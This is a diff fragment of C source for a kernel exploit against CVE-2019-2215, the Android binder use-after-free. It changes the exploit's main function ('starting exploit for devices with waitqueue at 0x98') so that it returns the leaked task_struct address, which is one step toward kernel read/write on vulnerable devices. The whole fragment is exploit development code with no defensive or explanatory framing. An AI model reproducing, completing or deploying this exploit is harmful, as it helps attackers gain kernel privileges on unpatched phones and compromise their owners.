@@ -521,8 +521,9 @@ unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
     return 0;
 }
 
-int cve_2019_2215_0x98(void)
+int cve_2019_2215_0x98(uint64_t *current_task_addr)
 {
+    *current_task_addr = 0;
     message("MAIN: starting exploit for devices with waitqueue at 0x98");
 
     if (pipe(kernel_rw_pipe))
@@ -537,6 +538,8 @@ int cve_2019_2215_0x98(void)
     if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
         error("Failed to leak data");
     }
+
+    *current_task_addr = task_struct_ptr;
 
     unsigned long thread_info_ptr;
     
